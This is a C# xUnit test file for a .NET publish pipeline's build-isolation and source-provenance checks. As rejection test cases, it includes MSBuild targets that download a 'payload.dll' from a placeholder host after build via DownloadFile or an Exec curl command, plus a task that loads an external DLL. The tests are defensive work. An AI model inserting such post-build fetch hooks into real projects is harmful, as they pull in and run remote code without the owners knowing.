using PowerForge;
using Xunit;

namespace PowerForge.Tests;

public sealed partial class DotNetPublishPipelineRunnerManifestProvenanceTests
{
    [Fact]
    public void ControlledBuildEnvironment_RemapsAmbientUserAndTemporaryDirectories()
    {
        string root = Directory.CreateTempSubdirectory().FullName;
        string controlledRoot = Directory.CreateDirectory(Path.Combine(root, "controlled")).FullName;
        try
        {
            Assert.True(DotNetPublishPipelineRunner.TryCreateControlledBuildEnvironment(
                new Dictionary<string, string?>
                {
                    ["HTTPS_PROXY"] = "http://example.test:8080"
                },
                root,
                controlledRoot,
                out IReadOnlyDictionary<string, string?> environment));

            string expectedRoot = Path.GetDirectoryName(controlledRoot)!;
            foreach (string name in new[] { "HOME", "USERPROFILE", "TEMP", "TMP", "TMPDIR" })
            {
                Assert.True(environment.TryGetValue(name, out string? value));
                Assert.False(string.IsNullOrWhiteSpace(value));
                Assert.StartsWith(
                    expectedRoot,
                    value!,
                    OperatingSystem.IsWindows()
                        ? StringComparison.OrdinalIgnoreCase
                        : StringComparison.Ordinal);
            }
            Assert.Equal("http://127.0.0.1:1", environment["HTTP_PROXY"]);
            Assert.Equal("http://127.0.0.1:1", environment["HTTPS_PROXY"]);
            Assert.Equal("http://127.0.0.1:1", environment["ALL_PROXY"]);
            Assert.Equal(string.Empty, environment["NO_PROXY"]);
        }
        finally
        {
            DeleteTestRepository(root);
        }
    }

    [Fact]
    public void ControlledBuildInputs_RejectRootedValueAfterMsBuildListSeparator()
    {
        string root = Directory.CreateTempSubdirectory().FullName;
        string externalRoot = Directory.CreateTempSubdirectory().FullName;
        try
        {
            File.WriteAllText(
                Path.Combine(root, "Directory.Build.targets"),
                $"<Project><PropertyGroup><Payload>placeholder;{Path.Combine(externalRoot, "payload.dll")}</Payload></PropertyGroup></Project>");

            Assert.False(DotNetPublishPipelineRunner.HasOnlyControlledBuildFileInputs(root));
        }
        finally
        {
            DeleteTestRepository(root);
            DeleteTestRepository(externalRoot);
        }
    }

    [Theory]
    [InlineData("<Project><Target Name=\"Fetch\" AfterTargets=\"Build\"><DownloadFile SourceUrl=\"https://example.invalid/payload.dll\" DestinationFolder=\"$(OutputPath)\" /></Target></Project>")]
    [InlineData("<Project><Target Name=\"Fetch\" AfterTargets=\"Build\"><Exec Command=\"curl https://example.invalid/payload.dll\" /></Target></Project>")]
    [InlineData("<Project><Target Name=\"Fetch\" AfterTargets=\"Build\"><MSBuild Projects=\"external.proj\" /></Target></Project>")]
    [InlineData("<Project><UsingTask TaskName=\"ExternalTask\" AssemblyFile=\"external.dll\" /></Project>")]
    [InlineData("<Project TreatAsLocalProperty=\"RunAnalyzers;RestoreSources\" />")]
    public void ControlledBuildInputs_RejectNetworkCapableTrackedTasks(string projectXml)
    {
        string root = Directory.CreateTempSubdirectory().FullName;
        try
        {
            File.WriteAllText(
                Path.Combine(root, "Directory.Build.targets"),
                projectXml);

            Assert.False(DotNetPublishPipelineRunner.HasOnlyControlledBuildFileInputs(root));
        }
        finally
        {
            DeleteTestRepository(root);
        }
    }

    [Fact]
    public void ReadSourceProvenance_PreservesBuildingProjectForDynamicReferenceDiscovery()
    {
        DotNetPublishPipelineRunner.SourceProvenance provenance = ReadProjectReferencePropertyRecoveryFixture(
            appProjectXml: """
                <Project Sdk="Microsoft.NET.Sdk">
                  <PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup>
                  <Target Name="CreateReference"
                          BeforeTargets="ResolveReferences"
                          Condition="'$(BuildProjectReferences)' == 'true' and '$(BuildingProject)' != 'false'">
                    <CreateItem Include="../Library/Library.csproj">
                      <Output TaskParameter="Include" ItemName="ProjectReference" />
                    </CreateItem>
                  </Target>
                </Project>
                """,
            libraryProjectXml: """
                <Project Sdk="Microsoft.NET.Sdk">
                  <PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup>
                  <ItemGroup><Compile Include="../../inputs/Selected.cs" /></ItemGroup>
                </Project>
                """,
            repositoryFiles: SelectedInput,
            mutatedPath: "inputs/Selected.cs",
            buildProperties: new Dictionary<string, string>
            {
                ["BuildProjectReferences"] = "true"
            },
            buildFramework: "net8.0");

        AssertSelectedInputIsDirty(provenance);
    }

    [Fact]
    public void ReadSourceProvenance_FailsClosedForUnresolvedReachableWrapperDependency()
    {
        DotNetPublishPipelineRunner.SourceProvenance provenance = ReadProjectReferencePropertyRecoveryFixture(
            appProjectXml: """
                <Project Sdk="Microsoft.NET.Sdk">
                  <PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup>
                  <Target Name="ReferenceWrapper"
                          BeforeTargets="ResolveReferences"
                          DependsOnTargets="$([System.String]::ToUpper('AddReference'))" />
                  <Target Name="ADDREFERENCE">
                    <ItemGroup><ProjectReference Include="../Library/Library.csproj" /></ItemGroup>
                  </Target>
                </Project>
                """,
            libraryProjectXml: """
                <Project Sdk="Microsoft.NET.Sdk">
                  <PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup>
                  <ItemGroup><Compile Include="../../inputs/Selected.cs" /></ItemGroup>
                </Project>
                """,
            repositoryFiles: SelectedInput,
            mutatedPath: "inputs/Selected.cs",
            buildFramework: "net8.0");

        Assert.True(provenance.Dirty);
        Assert.Contains(
            provenance.DirtyReasons,
            reason => reason.Contains("MSBuild input evaluation failed", StringComparison.Ordinal));
    }

    [Fact]
    public void ReadSourceProvenance_RejectsIgnoredUnrecordedNestedRepository()
    {
        string root = Directory.CreateTempSubdirectory().FullName;
        try
        {
            RunGit(root, "init");
            RunGit(root, "config user.name \"PowerForge Tests\"");
            RunGit(root, "config user.email \"powerforge-tests@example.invalid\"");
            string appDirectory = Directory.CreateDirectory(Path.Combine(root, "App")).FullName;
            string nestedDirectory = Directory.CreateDirectory(Path.Combine(root, "Nested")).FullName;
            string appProject = Path.Combine(appDirectory, "App.csproj");
            string libraryProject = Path.Combine(nestedDirectory, "Library.csproj");
            File.WriteAllText(appProject, """
                <Project Sdk="Microsoft.NET.Sdk">
                  <PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup>
                  <ItemGroup><ProjectReference Include="../Nested/Library.csproj" /></ItemGroup>
                </Project>
                """);
            File.WriteAllText(Path.Combine(appDirectory, "Program.cs"), "internal static class Program { }");
            File.WriteAllText(Path.Combine(root, ".gitignore"), "Nested/\nbin/\nobj/\n");

            RunGit(nestedDirectory, "init");
            RunGit(nestedDirectory, "config user.name \"PowerForge Tests\"");
            RunGit(nestedDirectory, "config user.email \"powerforge-tests@example.invalid\"");
            File.WriteAllText(
                libraryProject,
                "<Project Sdk=\"Microsoft.NET.Sdk\"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup></Project>");
            File.WriteAllText(Path.Combine(nestedDirectory, "Library.cs"), "public static class Library { }");
            File.WriteAllText(Path.Combine(nestedDirectory, ".gitignore"), "bin/\nobj/\n");
            RunGit(nestedDirectory, "add .");
            RunGit(nestedDirectory, "commit -m \"approved nested source\"");

            RunDotNet(root, $"restore \"{appProject}\" --use-lock-file --nologo");
            RunGit(root, "add .");
            RunGit(root, "commit -m \"approved source\"");

            DotNetPublishPipelineRunner.SourceProvenance provenance =
                DotNetPublishPipelineRunner.ReadSourceProvenance(
                    root,
                    buildProjectPaths: [appProject],
                    buildConfiguration: "Release");

            Assert.True(provenance.Dirty);
            Assert.Contains(
                provenance.DirtyReasons,
                reason => reason.Contains("Git ignored-input query failed", StringComparison.Ordinal));
        }
        finally
        {
            DeleteTestRepository(root);
        }
    }
}
